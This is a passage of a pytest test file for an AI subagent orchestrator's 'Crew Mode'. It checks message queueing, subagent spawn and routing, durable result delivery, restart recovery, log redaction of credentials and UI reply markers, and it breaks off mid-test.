"""Tests for Crew Mode (crew_chat.py): the engineered orchestrator pipeline.

Covers: durable store (queue entry lifecycle, restart reconciliation),
ingest (ack + queue entry), decision executor (validation, spawn/route/
hold/steer/ask/meta), conversation_busy → held, conversation_gone → respawn
with digest + payload replay, completion delivery (summary extraction,
attribution quote, held dispatch, stale completion), burst coalescing,
and mode plumbing (_VALID_MODES, create validation).
"""

from __future__ import annotations

import asyncio
import logging
import threading
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

import kiro_crew.crew_chat as crew_mod
from kiro_crew.crew_chat import CrewOrchestrator, CrewStore


@pytest.fixture(autouse=True)
def _isolate_crew_dir(tmp_path, monkeypatch):  # type: ignore[no-untyped-def]
    monkeypatch.setattr(crew_mod, "data_home", lambda: tmp_path)


def _slot(key: str = "s1", agent: str = "kirocrew") -> MagicMock:
    slot = MagicMock()
    slot.key = key
    slot.agent = agent
    slot.linked_session_key = ""
    return slot


def _spawn_info(run_id: str, done: bool = False, error: str = "", result: str = "",
                outcome: str = "") -> MagicMock:
    info = MagicMock()
    info.id = run_id
    info.done = done
    info.error = error
    info.result = result
    info.outcome = outcome or ("failed" if error else "completed")
    return info


def _orch(state: MagicMock | None = None, subagents: MagicMock | None = None) -> CrewOrchestrator:
    state = state or MagicMock()
    subagents = subagents or MagicMock()
    sessions = MagicMock()
    return CrewOrchestrator(state=state, sessions=sessions, subagents=subagents)


def _slot_save(side_effect: BaseException | None = None):
    """Patch the forced slot save `_post_durable` uses as its durability proof.

    `_post_durable` imports it inside the call (dashboard/__init__ is lazy), so
    patching the source module attribute is what the production path resolves.
    """
    return patch(
        "kiro_crew.dashboard.chat_persistence.save_slot_off_loop",
        new=AsyncMock(side_effect=side_effect),
    )


# ── store ──


class TestCrewStore:
    def test_add_and_persist_roundtrip(self) -> None:
        st = CrewStore("s1")
        e = st.add_msg("hello")
        st.add_topic("t1", "r1", "title", e["msg_id"])
        st2 = CrewStore("s1")  # fresh load from disk
        assert st2.entry(e["msg_id"])["text"] == "hello"
        assert st2.topic("t1")["active_run_id"] == "r1"

    def test_pending_includes_ask_state(self) -> None:
        st = CrewStore("s1")
        a = st.add_msg("m1")
        b = st.add_msg("m2")
        a["state"] = "ask"
        b["state"] = "done"
        assert [e["msg_id"] for e in st.pending()] == [a["msg_id"]]


# ── ingest ──


class TestIngest:
    @pytest.mark.asyncio
    async def test_ingest_enqueues_acks_and_schedules(self) -> None:
        orch = _orch()
        slot = _slot()
        with patch.object(orch, "_decide", new=AsyncMock()) as decide, \
             patch.object(orch, "_post") as post:
            await orch.ingest(slot, "do thing A")
            await asyncio.sleep(0)
        st = orch._store("s1")
        assert len(st.pending()) == 1
        post.assert_called_once()          # instant templated ack
        assert decide.await_count == 1 or decide.call_count == 1

    @pytest.mark.asyncio
    async def test_single_flight_folds_reentry(self) -> None:
        orch = _orch()
        slot = _slot()
        lock = orch._locks.setdefault("s1", asyncio.Lock())
        await lock.acquire()
        try:
            await orch._decide(slot)  # lock held → folds into rerun flag
            assert orch._rerun["s1"] is True
        finally:
            lock.release()


# ── executor ──


class TestExecutor:
    @pytest.mark.asyncio
    async def test_spawn_creates_owned_topic(self) -> None:
        subagents = MagicMock()
        subagents.spawn = MagicMock(return_value=_spawn_info("r1"))
        orch = _orch(subagents=subagents)
        slot = _slot()
        st = orch._store("s1")
        e = st.add_msg("build X")
        with patch.object(orch, "_post"):
            await orch._apply(slot, st, {"do": "spawn", "msg_id": e["msg_id"], "title": "build X"})
        assert orch.owns("r1")
        assert st.topic("r1")["status"] == "running"
        assert e["state"] == "accepted"
        # keep=True is mandatory (retention promotes at spawn)
        assert subagents.spawn.call_args.kwargs["keep"] is True
        # anti-nesting + summary contract appended
        assert "Do NOT spawn subagents" in subagents.spawn.call_args.args[0]
        assert "<<<SUMMARY" in subagents.spawn.call_args.args[0]

    @pytest.mark.asyncio
    async def test_unknown_msg_id_rejected(self) -> None:
        orch = _orch()
        st = orch._store("s1")
        await orch._apply(_slot(), st, {"do": "spawn", "msg_id": "nope", "title": "x"})
        assert st.topics == []

    @pytest.mark.asyncio
    async def test_route_to_running_topic_holds(self) -> None:
        orch = _orch()
        st = orch._store("s1")
        e = st.add_msg("follow-up")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "running"
        await orch._apply(_slot(), st, {"do": "route", "msg_id": e["msg_id"], "topic_id": "t1"})
        assert e["state"] == "held"
        assert t["held"] == [e["msg_id"]]

    @pytest.mark.asyncio
    async def test_route_to_idle_topic_continues(self) -> None:
        subagents = MagicMock()
        subagents.continue_conversation = MagicMock(return_value=_spawn_info("r2"))
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("follow-up")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "idle"
        await orch._apply(_slot(), st, {"do": "route", "msg_id": e["msg_id"], "topic_id": "t1"})
        assert t["active_run_id"] == "r2"
        assert t["status"] == "running"
        assert orch.owns("r2")
        assert e["state"] == "accepted"

    @pytest.mark.asyncio
    async def test_continue_busy_becomes_held(self) -> None:
        subagents = MagicMock()
        subagents.continue_conversation = MagicMock(
            return_value=_spawn_info("x", done=True, error="conversation_busy: run r1 in flight")
        )
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("follow-up")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "idle"  # store thinks idle but manager says busy
        await orch._apply(_slot(), st, {"do": "route", "msg_id": e["msg_id"], "topic_id": "t1"})
        assert e["state"] == "held"
        assert e["msg_id"] in t["held"]

    @pytest.mark.asyncio
    async def test_continue_gone_respawns_with_digest_and_payload(self) -> None:
        subagents = MagicMock()
        subagents.continue_conversation = MagicMock(
            return_value=_spawn_info("x", done=True, error="conversation_gone: expired")
        )
        subagents.spawn = MagicMock(return_value=_spawn_info("r9"))
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("original payload text")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "idle"
        t["digest"] = "prior findings digest"
        await orch._apply(_slot(), st, {"do": "route", "msg_id": e["msg_id"], "topic_id": "t1"})
        seed = subagents.spawn.call_args.args[0]
        assert "prior findings digest" in seed
        assert "original payload text" in seed  # user never re-types
        assert t["topic_id"] == "r9" and orch.owns("r9")

    @pytest.mark.asyncio
    async def test_steer_only_when_running(self) -> None:
        subagents = MagicMock()
        subagents.steer_run = AsyncMock(return_value=(True, "ok"))
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("prefer python")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "idle"
        await orch._apply(_slot(), st, {"do": "steer", "msg_id": e["msg_id"], "topic_id": "t1"})
        subagents.steer_run.assert_not_awaited()  # executor rejects illegal steer
        t["status"] = "running"
        await orch._apply(_slot(), st, {"do": "steer", "msg_id": e["msg_id"], "topic_id": "t1"})
        subagents.steer_run.assert_awaited_once()
        assert e["state"] == "steered"

    @pytest.mark.asyncio
    async def test_lost_steer_falls_back_to_held(self) -> None:
        subagents = MagicMock()
        subagents.steer_run = AsyncMock(return_value=(False, "session_starting"))
        orch = _orch(subagents=subagents)
        st = orch._store("s1")
        e = st.add_msg("prefer python")
        t = st.add_topic("t1", "r1", "topic", "m0")
        t["status"] = "running"
        await orch._apply(_slot(), st, {"do": "steer", "msg_id": e["msg_id"], "topic_id": "t1"})
        assert e["state"] == "held" and e["msg_id"] in t["held"]

    @pytest.mark.asyncio
    async def test_ask_and_meta(self) -> None:
        orch = _orch()
        st = orch._store("s1")
        e1 = st.add_msg("ambiguous")
        e2 = st.add_msg("what's in flight?")
        with patch.object(orch, "_post") as post:
            await orch._apply(_slot(), st, {"do": "ask", "msg_id": e1["msg_id"], "question": "new topic?"})
            await orch._apply(_slot(), st, {"do": "meta", "msg_id": e2["msg_id"]})
        assert e1["state"] == "ask"
        assert e2["state"] == "done"
        assert post.call_count == 2


# ── completion delivery ──


class TestCompletion:
    def _delivery_setup(self):  # type: ignore[no-untyped-def]
        state = MagicMock()
        slot = _slot()
        state.get_slot = MagicMock(return_value=slot)
        orch = _orch(state=state)
        st = orch._store("s1")
        e = st.add_msg("check the feed 403 thing")
        t = st.add_topic("t1", "r1", "feed 403", e["msg_id"])
        e["state"] = "accepted"
        e["run_id"] = "r1"
        orch._owned["r1"] = "s1"
        return orch, st, t, e, slot

    @pytest.mark.asyncio
    async def test_summary_extraction_and_attribution(self) -> None:
        orch, st, t, e, slot = self._delivery_setup()
        info = _spawn_info("r1", done=True, result="long output <<<SUMMARY root cause found: yml missing >>> tail")
        with patch.object(orch, "_post") as post:
            await orch.on_subagent_done(info)
        body = post.call_args.args[1]
        assert "root cause found: yml missing" in body
        assert "↩ re:" in body and "check the feed 403" in body
        assert t["status"] == "idle"
        assert t["digest"].startswith("root cause found")
        assert e["state"] == "done"
        assert not orch.owns("r1")

    @pytest.mark.asyncio
    async def test_missing_summary_falls_back_to_result(self) -> None:
        orch, st, t, e, slot = self._delivery_setup()
        info = _spawn_info("r1", done=True, result="plain result no delimiter")
        with patch.object(orch, "_post") as post:
            await orch.on_subagent_done(info)
        assert "plain result no delimiter" in post.call_args.args[1]

    @pytest.mark.asyncio
    async def test_stale_completion_ignored(self) -> None:
        orch, st, t, e, slot = self._delivery_setup()
        orch._owned["r_old"] = "s1"  # old run, no topic points at it
        info = _spawn_info("r_old", done=True, result="stale")
        with patch.object(orch, "_post") as post:
            await orch.on_subagent_done(info)
        post.assert_not_called()
        assert t["status"] == "running"  # untouched

    @pytest.mark.asyncio
    async def test_held_head_dispatched_on_completion(self) -> None:
        orch, st, t, e, slot = self._delivery_setup()
        held = st.add_msg("queued follow-up")
        held["state"] = "held"
        t["held"] = [held["msg_id"]]
        orch._subagents.continue_conversation = MagicMock(return_value=_spawn_info("r2"))
        info = _spawn_info("r1", done=True, result="<<<SUMMARY done >>>")
        with patch.object(orch, "_post"):
            await orch.on_subagent_done(info)
        assert t["active_run_id"] == "r2"
        assert t["status"] == "running"
        assert orch.owns("r2")

    @pytest.mark.asyncio
    async def test_each_result_delivers_as_its_own_message(self) -> None:
        # One completion = one message, even back-to-back: each forward is the
        # final answer for a DIFFERENT topic, so merging them into one bubble
        # (as the earlier coalescing window did) destroys the per-topic
        # structure the code-driven forward path exists to provide.
        state = MagicMock()
        slot = _slot()
        state.get_slot = MagicMock(return_value=slot)
        orch = _orch(state=state)
        with patch.object(orch, "_post") as post:
            await orch._queue_forward(slot, "result A")
            await orch._queue_forward(slot, "result B")
        bodies = [c.args[1] for c in post.call_args_list]
        assert bodies == ["result A", "result B"]

    @pytest.mark.asyncio
    async def test_a_lone_result_is_not_delayed(self) -> None:
        # The old coalesce window stalled even a single result; delivery is now
        # synchronous with the completion.
        orch = _orch()
        slot = _slot()
        with patch.object(orch, "_post") as post:
            await orch._queue_forward(slot, "only result")
            post.assert_called_once()          # no coalesce window to wait out


class TestAnswerMarking:
    """The answer kinds must be distinguishable in the PERSISTED transcript, so
    the UI can keep them out of the reasoning-collapse pane after a reload."""

    @pytest.mark.parametrize("kind,expect_marker", [
        ("crew_result", True), ("crew_meta", True), ("crew_ask", True),
        ("crew_ack", False), ("crew", False),
    ])
    def test_answer_kinds_carry_the_marker_class(self, kind: str, expect_marker: bool) -> None:
        orch = _orch()
        slot = _slot()
        orch._post(slot, "body", kind=kind)
        cls = slot.append.call_args.args[2]
        assert ("crew-reply" in cls) is expect_marker
        assert cls.startswith("msg msg-a")


class TestUnsettledEntriesAreNotStranded:
    """A decision pass can return valid JSON that settles nothing."""

    @pytest.mark.asyncio
    async def test_a_permanently_unsettled_entry_fails_visibly(self) -> None:
        # Empty actions (or actions the executor rejects) leave the entry pending
        # with nothing scheduled to look at it again. The user's whole experience
        # was the acknowledgement, forever — so after a bounded number of tries
        # the entry must fail with something the user can act on.
        orch = _orch()
        slot = _slot()
        st = orch._store("s1")
        e = st.add_msg("something the decider cannot route")

        with patch.object(orch, "_decide_once", new=AsyncMock()), \
                patch.object(orch, "_post", return_value=True) as post:
            await orch._decide(slot)

        assert st.entry(e["msg_id"])["state"] == "failed"
        assert post.called, "the user must be told, not left waiting"
        assert "rephrase" in post.call_args.args[1]

    @pytest.mark.asyncio
    async def test_a_settled_entry_needs_no_retry(self) -> None:
        orch = _orch()
        slot = _slot()
        st = orch._store("s1")
        e = st.add_msg("routable")

        async def _settle(_slot):
            e["state"] = "accepted"

        with patch.object(orch, "_decide_once", side_effect=_settle), \
                patch.object(orch, "_post", return_value=True) as post:
            await orch._decide(slot)

        assert st.entry(e["msg_id"])["state"] == "accepted"
        assert not post.called, "nothing to apologise for"


class TestGptRoundThirteen:
    """The four blocking findings from the review of 1ec00adf5."""

    def test_the_marker_rides_meta_not_only_the_class(self) -> None:
        # `chat_persistence._build_message_entry` keeps `cls` ONLY for
        # role == "system" and drops it for assistant, while it keeps `meta` for
        # every role — so the periodic slot flush erased a class-only marker.
        # This is why patching one channel per round kept leaving another.
        orch = _orch()
        slot = _slot()
        orch._post(slot, "an answer", kind="crew_result")
        meta = slot.append.call_args.kwargs.get("meta")
        assert isinstance(meta, dict) and meta.get("crew_reply") is True, \
            "the durable marker is missing from assistant meta"
        frame = orch._state.broadcast_ws.call_args.args[1]
        assert (frame.get("meta") or {}).get("crew_reply") is True

    def test_the_ack_carries_no_marker_in_meta(self) -> None:
        orch = _orch()
        slot = _slot()
        orch._post(slot, "On it.", kind="crew")
        assert not (slot.append.call_args.kwargs.get("meta") or {}).get("crew_reply")

    @pytest.mark.asyncio
    async def test_held_queue_drains_even_when_forwarding_fails(self) -> None:
        # Delivery and dispatch are independent obligations of one completion: the
        # topic is idle by now, so a held follow-up left behind it would never be
        # dispatched by any future completion.
        orch = _orch()
        st = orch._store("s1")
        e = st.add_msg("first task")
        held = st.add_msg("follow up")
        held["state"] = "held"
        t = st.add_topic("t1", "r1", "the topic", e["msg_id"])
        t["status"] = "running"
        t["held"] = [held["msg_id"]]
        e["state"] = "accepted"
        e["run_id"] = "r1"
        st.save()
        orch._owned["r1"] = "s1"

        with patch.object(orch, "_queue_forward",
                          new=AsyncMock(side_effect=RuntimeError("disk full"))), \
                patch.object(orch, "_dispatch_continue", new=AsyncMock()) as disp:
            with pytest.raises(RuntimeError):
                await orch.on_subagent_done(_spawn_info("r1", done=True, result="done"))
        disp.assert_awaited(), "the held follow-up was stranded behind an idle topic"

    @pytest.mark.asyncio
    async def test_forward_cleared_only_after_the_transcript_row_is_durable(self) -> None:
        # `_post` schedules the durable transcript append off-loop, so its True is
        # "delivered and scheduled", not "on disk". Dropping the only durable copy
        # on that weaker promise loses the result if a crash beats the append.
        orch = _orch()
        landed: list[str] = []

        async def _never_lands():
            raise OSError("history lock contention")

        with patch.object(orch, "_post", return_value=True), \
                patch.object(crew_mod, "append_if_absent_off_loop",
                             return_value=asyncio.ensure_future(_never_lands())), \
                _slot_save(side_effect=OSError("history lock contention")):
            orch._last_transcript_write = asyncio.ensure_future(_never_lands())
            ok = await orch._post_durable(_slot(), "body", kind="crew_result")
        assert ok is False, "a failed durable append must not report success"
        assert landed == []

    @pytest.mark.asyncio
    async def test_queue_forward_keeps_the_copy_when_the_append_fails(self) -> None:
        # The discriminating case for the CALL SITE: delivery succeeded, but the
        # durable transcript row did not land. `_post`'s True alone would have
        # cleared the only durable copy of the result.
        orch = _orch()
        slot = _slot()

        async def _boom():
            raise OSError("history lock contention")

        def _post_ok(*a, **k):
            orch._last_transcript_write = asyncio.ensure_future(_boom())
            return True

        with patch.object(orch, "_post", side_effect=_post_ok), \
                _slot_save(side_effect=OSError("history lock contention")):
            await orch._queue_forward(slot, "result body")
        await orch._store("s1").wait_writes()
        assert [f["body"] for f in CrewStore("s1").forwards] == ["result body"], \
            "the forward was cleared even though its transcript row never landed"

    @pytest.mark.asyncio
    async def test_an_inline_transcript_append_counts_as_durable(self) -> None:
        # No running loop at append time means the append was written inline, so
        # there is no future to await — but the slot save still has to confirm.
        orch = _orch()
        slot = _slot()
        with patch.object(orch, "_post", return_value=True), _slot_save() as save:
            orch._last_transcript_write = None
            assert await orch._post_durable(slot, "body", kind="crew_result") is True
        save.assert_awaited_once()

    @pytest.mark.asyncio
    async def test_post_durable_awaits_the_real_helpers_future(self) -> None:
        # The PRODUCTION seam, with `append_if_absent_off_loop` UNPATCHED. The
        # sibling tests hand `_post_durable` a future they built themselves, so
        # they prove "awaits a future when one is present" while staying green
        # even if the helper never produces one — the state that made the barrier
        # a no-op on every running-loop path. Here the append BLOCKS in its
        # worker thread, so the only way the call can still be in flight is that
        # the helper's future was returned and is being awaited.
        orch = _orch()
        gate = threading.Event()
        orch._state.conversation_log.append_if_absent.side_effect = (
            lambda *a, **k: gate.wait(10)
        )
        with _slot_save():
            task = asyncio.ensure_future(
                orch._post_durable(_slot(), "body", kind="crew_result")
            )
            await asyncio.sleep(0.05)
            in_flight = not task.done()
            gate.set()
            ok = await task
        assert in_flight, (
            "_post_durable returned while the transcript append was still "
            "blocked — nothing was awaited, so the helper handed back None "
            "instead of its executor future"
        )
        assert ok is True

    @pytest.mark.asyncio
    async def test_a_repeated_body_still_forces_its_own_durable_write(self) -> None:
        # `append_if_absent` dedupes by CONTENT, so a second identical completion
        # body is a successful NO-OP append: the future resolves while no new row
        # reaches disk. Awaiting only that append would clear the forward for a
        # message that exists nowhere but the in-memory slot.
        orch = _orch()
        slot = _slot()
        orch._state.conversation_log.append_if_absent.return_value = None  # skipped

        with _slot_save(side_effect=OSError("history lock contention")) as save:
            ok = await orch._post_durable(slot, "same body", kind="crew_result")
        assert save.await_count == 1, (
            "the repeated body was never force-persisted — a content-deduped "
            "append cannot prove this row is on disk"
        )
        assert ok is False, "an unconfirmed durable write must not report success"


class TestGptRoundEleven:
    """The two blocking findings from the review of 7346dec2b."""

    @pytest.mark.asyncio
    async def test_durable_lookups_happen_off_the_loop(self) -> None:
        # `_reconcile` legitimately stays on the loop (it posts and schedules),
        # but its per-entry state.json reads scale with the queue — a restart
        # with many accepted entries stalled the loop one stat() at a time.
        st = CrewStore("evid1")
        for i in range(4):
            e = st.add_msg(f"task {i}")
            e["state"] = "accepted"
            e["dispatch_id"] = f"run{i}"
        st.save()
        await st.wait_writes()

        seen: list[str] = []

        def _tracking_read(rid):                       # type: ignore[no-untyped-def]
            seen.append(threading.current_thread().name)
            return None

        orch = _orch()
        orch._subagents.get = MagicMock(return_value=None)
        orch._state.get_slot = MagicMock(return_value=None)
        with patch.object(crew_mod, "read_state", side_effect=_tracking_read):
            await orch._store_async("evid1")
        assert seen, "no durable lookup happened"
        assert all(nm != threading.main_thread().name for nm in seen), \
            "a durable run lookup ran on the event loop"

    @pytest.mark.asyncio
    async def test_pregathered_evidence_is_not_re_read(self) -> None:
        # The evidence dict is authoritative for the ids it covers; consulting
        # the filesystem again would put the same reads back on the loop.
        orch = _orch()
        orch._subagents.get = MagicMock(return_value=None)
        with patch.object(crew_mod, "read_state") as rs:
            assert orch._run_started("r1", {"r1": True}) is True
            assert orch._run_started("r2", {"r2": False}) is False
        rs.assert_not_called()

    @pytest.mark.asyncio
    async def test_the_user_message_is_durable_before_it_is_visible(self) -> None:
        # The handler used to append the message and THEN await ingest; on a cold
        # slot that await builds the store, so a process exit in that window left
        # a visible message with no queue entry — unresumable. The property to
        # hold is exactly this: at the moment it becomes visible, the entry is
        # already ON DISK. Asserting that directly needs no barrier patching.
        orch = _orch()
        slot = _slot()
        slot.key = "vis1"                    # own store; no state from other tests
        on_disk_when_shown: list[list[str]] = []
        slot.append = MagicMock(side_effect=lambda *a, **k: on_disk_when_shown.append(
            [e["text"] for e in CrewStore("vis1").queue]))

        with patch.object(orch, "_post", return_value=True), \
                patch.object(orch, "_decide", new=AsyncMock()):
            await orch.ingest(slot, "do the thing")

        assert on_disk_when_shown == [["do the thing"]], \
            f"message shown before its queue entry reached disk: {on_disk_when_shown}"

    @pytest.mark.asyncio
    async def test_the_caller_no_longer_appends(self) -> None:
        # Guards the split: if a future edit re-adds an append in api_chat, the
        # message would show up twice.
        import inspect

        from kiro_crew.dashboard import chat_handlers
        src = inspect.getsource(chat_handlers.api_chat)
        crew_branch = src.split('getattr(slot, "mode", "") == "crew"', 1)[1][:600]
        assert "_crew.ingest(" in crew_branch
        assert 'slot.append("user"' not in crew_branch, \
            "api_chat appends the user message again — ingest already does it"


class TestGptRoundNine:
    """The four blocking findings from the review of adb35578e."""

    @pytest.mark.asyncio
    async def test_has_live_work_does_not_build_a_store_on_the_loop(self) -> None:
        # It is called from the async mode-switch handler, and its cold path used
        # `CrewStore(slot_key)` directly — three JSON parses on the loop.
        seen: list[str] = []
        real_init = CrewStore.__init__

        def _tracking_init(self, slot_key):          # type: ignore[no-untyped-def]
            seen.append(threading.current_thread().name)
            real_init(self, slot_key)

        orch = _orch()
        with patch.object(CrewStore, "__init__", _tracking_init):
            await orch.has_live_work("cold1")
        assert seen, "no store was built"
        assert seen[0] != threading.main_thread().name, \
            "has_live_work built its store on the event loop"

    @pytest.mark.asyncio
    async def test_concurrent_first_messages_share_one_store(self) -> None:
        # Both callers miss the cache and both build; publishing unconditionally
        # let the loser keep writing through its own object to the same files.
        orch = _orch()
        with patch.object(orch, "_reconcile") as rec:
            a, b = await asyncio.gather(orch._store_async("race1"),
                                        orch._store_async("race1"))
        assert a is b, "two stores were published for one slot"
        assert rec.call_count == 1, "reconciliation must run for the winner only"

    def test_an_unreadable_state_file_is_not_read_as_never_started(self) -> None:
        # `read_state` returns None for a MISSING file AND for one it could not
        # parse, so its None alone cannot mean "never ran" — that would
        # re-dispatch a task which may already have mutated something.
        orch = _orch()
        orch._subagents.get = MagicMock(return_value=None)
        with patch.object(crew_mod, "read_state", return_value=None), \
                patch.object(crew_mod, "_agent_dir") as ad:
            ad.return_value.exists.return_value = True      # the run DOES exist
            assert orch._run_started("corrupt1") is True

    def test_a_positively_absent_run_dir_reopens(self) -> None:
        orch = _orch()
        orch._subagents.get = MagicMock(return_value=None)
        with patch.object(crew_mod, "read_state", return_value=None), \
                patch.object(crew_mod, "_agent_dir") as ad:
            ad.return_value.exists.return_value = False     # never dispatched
            assert orch._run_started("gone1") is False

    def test_the_marker_reaches_the_durable_log(self, tmp_path) -> None:  # type: ignore[no-untyped-def]
        # Chat history has TWO sources: the in-memory slot (which carried the
        # marker) and, after a restart, this log — whose append had no cls
        # parameter, so the marker survived a reload but not a restart.
        from kiro_crew.history import ConversationLog
        log = ConversationLog(tmp_path)
        log.append("dashboard:s1", "assistant", "an answer",
                   cls="msg msg-a crew-reply")
        rows = log.read_messages("dashboard:s1")
        assert any("crew-reply" in (r.get("cls") or "") for r in rows), \
            "the durable copy lost the marker"

    def test_an_unmarked_message_writes_no_cls_field(self, tmp_path) -> None:  # type: ignore[no-untyped-def]
        # Additive: existing callers and existing rows are unchanged.
        from kiro_crew.history import ConversationLog
        log = ConversationLog(tmp_path)
        log.append("dashboard:s1", "assistant", "plain")
        rows = log.read_messages("dashboard:s1")
        assert rows and "cls" not in rows[-1]


class TestColdStoreLoadsOffLoop:
    """Building a store is a mkdir plus three JSON parses, and the queue grows
    with the session — so a cold build on a busy slot must not sit on the loop."""

    @pytest.mark.asyncio
    async def test_a_cold_store_is_built_in_the_executor(self) -> None:
        seen: list[str] = []
        real_init = CrewStore.__init__

        def _tracking_init(self, slot_key):          # type: ignore[no-untyped-def]
            seen.append(threading.current_thread().name)
            real_init(self, slot_key)

        orch = _orch()
        with patch.object(CrewStore, "__init__", _tracking_init):
            st = await orch._store_async("s1")
        assert st is not None
        assert seen, "the store was never built"
        assert seen[0] != threading.main_thread().name, \
            "the cold build ran on the event loop's thread"

    @pytest.mark.asyncio
    async def test_a_cached_store_needs_no_executor_hop(self) -> None:
        orch = _orch()
        first = await orch._store_async("s1")
        with patch.object(CrewStore, "__init__", side_effect=AssertionError("rebuilt")):
            again = await orch._store_async("s1")
        assert again is first

    @pytest.mark.asyncio
    async def test_reconciliation_still_happens_on_a_cold_build(self) -> None:
        # Only the BUILD is offloaded; reconcile posts and schedules, so it must
        # still run — and on the loop.
        orch = _orch()
        with patch.object(orch, "_reconcile") as rec:
            await orch._store_async("s1")
        rec.assert_called_once()


class TestGptRoundSeven:
    """The four blocking findings from the review of b58ead343."""

    def test_the_live_frame_carries_the_crew_reply_marker(self) -> None:
        # The marker went into the PERSISTED cls so it would survive a reload —
        # but the ws frame omitted it, so it worked ONLY after a reload and a
        # live crew answer was still collapsed into "Worked through N steps".
        # The store reducer reads `cls` off the payload, so it must ride along.
        orch = _orch()
        slot = _slot()
        orch._post(slot, "an answer", kind="crew_result")
        frame = orch._state.broadcast_ws.call_args.args[1]
        assert "crew-reply" in frame.get("cls", ""), "live frame lost the marker"
        # And the persisted copy still carries it (both paths, one value).
        assert "crew-reply" in slot.append.call_args.args[2]

    def test_the_ack_frame_is_not_marked(self) -> None:
        orch = _orch()
        slot = _slot()
        orch._post(slot, "On it.", kind="crew")
        frame = orch._state.broadcast_ws.call_args.args[1]
        assert "crew-reply" not in frame.get("cls", "")

    @pytest.mark.asyncio
    async def test_an_unparseable_decision_is_redacted_before_logging(self, caplog) -> None:  # type: ignore[no-untyped-def]
        # The log is a SECOND egress for untrusted model text; `_post` being the
        # delivery chokepoint does not cover it. Assert on what actually reaches
        # the logger, not on the helper — the call site is what can regress.
        secret = "AKIAIOSFODNN7EXAMPLE"
        orch = _orch()
        slot = _slot()
        st = orch._store("s1")
        st.add_msg("do the thing")

        async def _bad_json(*a, **kw):
            # Must contain braces so the extractor matches and json.loads is
            # what fails — brace-less text yields actions=[] with no log line.
            return "{broken json, credential: " + secret + "}"

        with caplog.at_level(logging.WARNING):
            with patch.object(crew_mod, "run_bg_oneliner", side_effect=_bad_json):
                await orch._decide_once(slot)
        assert caplog.text, "the parse failure must still be logged"
        assert secret not in caplog.text, "raw model output leaked into the log"

    def test_the_log_redactor_withholds_rather_than_leaks(self) -> None:
        out = CrewOrchestrator._safe_for_log("token: AKIAIOSFODNN7EXAMPLE")
        assert "AKIAIOSFODNN7EXAMPLE" not in out

    def test_redaction_failure_withholds_rather_than_leaks(self) -> None:
        with patch.object(crew_mod, "redact_credentials", side_effect=RuntimeError("boom")):
            out = CrewOrchestrator._safe_for_log("token: AKIAIOSFODNN7EXAMPLE")
        assert "AKIAIOSFODNN7EXAMPLE" not in out

    @pytest.mark.asyncio
    async def test_a_temporary_slot_does_not_leak_memory_into_subagents(self) -> None:
        # `blocks_reads` (temporary memory mode) blocks memory-context injection.
        # chat_runner passes it on the main path; crew dispatch must too, or a
        # temporary crew slot injects stored memory and lessons into every run.
        orch = _orch()
        slot = _slot()
        slot.blocks_reads = True
        st = orch._store("s1")
        e = st.add_msg("do the thing")
        orch._subagents.spawn = MagicMock(return_value=_spawn_info("r1"))
        await orch._apply(slot, st, {"do": "spawn", "msg_id": e["msg_id"], "title": "t"})
        kw = orch._subagents.spawn.call_args.kwargs
        assert kw["include_memory"] is False
        assert kw["include_lessons"] is False

    @pytest.mark.asyncio
    async def test_a_persistent_slot_still_gets_its_context(self) -> None:
        orch = _orch()
        slot = _slot()
        slot.blocks_reads = False
        st = orch._store("s1")
        e = st.add_msg("do the thing")
        orch._subagents.spawn = MagicMock(return_value=_spawn_info("r1"))
        await orch._apply(slot, st, {"do": "spawn", "msg_id": e["msg_id"], "title": "t"})
        kw = orch._subagents.spawn.call_args.kwargs
        assert kw["include_memory"] is True
        assert kw["include_lessons"] is True

    def test_resumption_does_not_block_its_caller(self) -> None:
        # The gateway calls this on the boot path, so it must schedule the
        # profile-sized filesystem work rather than perform it: doing the scan
        # inline delayed readiness and stalled every other loop activity.
        orch = _orch()
        with patch.object(orch, "_resume_all", new=AsyncMock()) as ra:
            with patch.object(crew_mod.asyncio, "get_running_loop") as grl:
                orch.resume_persisted_slots()
                grl.return_value.create_task.assert_called_once()
        assert not ra.await_count, "the work must be scheduled, not awaited inline"

    def test_resumption_without_a_loop_is_survivable(self) -> None:
        orch = _orch()
        with patch.object(crew_mod.asyncio, "get_running_loop", side_effect=RuntimeError):
            orch.resume_persisted_slots()      # must not raise


class TestRestartResumesWork:
    """Constructing the orchestrator is not resuming it."""

    @pytest.mark.asyncio
    async def test_a_pending_entry_gets_a_decision_pass(self) -> None:
        # The evidence of the bug was: ack, then silence forever. `_store` only
        # reconciles on first touch and nothing touched it until a NEW message
        # arrived, so the acknowledged request was never looked at again.
        st = CrewStore("s1")
        st.add_msg("do the thing")
        st.save()
        await st.wait_writes()

        orch = _orch()
        slot = _slot()
        orch._state.get_slot = MagicMock(return_value=slot)
        with patch.object(orch, "_decide", new=AsyncMock()) as decide:
            assert await orch._resume_all() >= 1
        decide.assert_awaited()

    @pytest.mark.asyncio
    async def test_a_persisted_forward_is_redelivered(self) -> None:
        st = CrewStore("s1")
        st.add_forward("a result nobody saw")
        st.save()
        await st.wait_writes()

        orch = _orch()
        slot = _slot()
        orch._state.get_slot = MagicMock(return_value=slot)
        with patch.object(orch, "_post", return_value=True) as post:
            await orch._resume_all()
        assert any("a result nobody saw" in c.args[1] for c in post.call_args_list)

    @pytest.mark.asyncio
    async def test_an_idle_slot_is_not_resumed(self) -> None:
        st = CrewStore("s1")
        e = st.add_msg("already handled")
        e["state"] = "done"
        st.save()
        await st.wait_writes()

        orch = _orch()
        orch._state.get_slot = MagicMock(return_value=_slot())
        with patch.object(orch, "_decide", new=AsyncMock()) as decide:
            assert await orch._resume_all() == 0
        decide.assert_not_awaited()


class TestDeliveryFailureKeepsTheResult:
    """A failed delivery must not consume the only durable copy."""

    @pytest.mark.asyncio
    async def test_forward_survives_a_refused_post(self) -> None:
        # `_post` refuses to deliver when redaction fails, and used to do so
